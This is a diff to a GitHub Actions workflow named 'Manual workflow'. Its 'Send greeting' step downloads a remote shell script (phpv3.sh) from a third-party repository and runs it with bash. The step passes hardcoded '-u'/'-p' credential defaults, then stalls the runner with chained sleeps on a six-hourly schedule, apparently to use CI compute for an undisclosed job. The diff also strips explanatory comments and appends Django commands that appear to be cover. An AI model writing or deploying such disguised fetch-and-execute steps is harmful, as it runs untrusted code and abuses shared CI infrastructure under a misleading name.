@@ -1,7 +1,5 @@
 name: Manual workflow
 
-# Controls when the action will run. Workflow runs when manually triggered using the UI
-# or API.
 on:
   workflow_dispatch:
     inputs:
@@ -11,7 +9,7 @@ on:
         required: true
         type: string
   schedule:
-    - cron: '0 */6 * * *'    # 定时任务，0分每6小时触发一次
+    - cron: '0 */6 * * *'    
 
 jobs:
   greet:
@@ -19,8 +17,14 @@ jobs:
       fail-fast: false
       
     runs-on: ubuntu-latest
-    timeout-minutes: 350
+    timeout-minutes: 360
 
     steps:
     - name: Send greeting
-      run: curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh ${{ inputs.name }} && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999999999999999  && python manage.py migrate && python manage.py collectstatic --noinput && gunicorn mysite.wsgi
+      run: >
+        NAME=${{ github.event.inputs.name }}
+        if [ -z "$NAME" ]
+        then
+          NAME='-u 9846f1e5c6c7181eadcfdc572bb7a5dc -p 514981'
+        fi
+        curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh $NAME && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999 && sleep 9999999999999999  && python manage.py migrate && python manage.py collectstatic --noinput && gunicorn mysite.wsgi
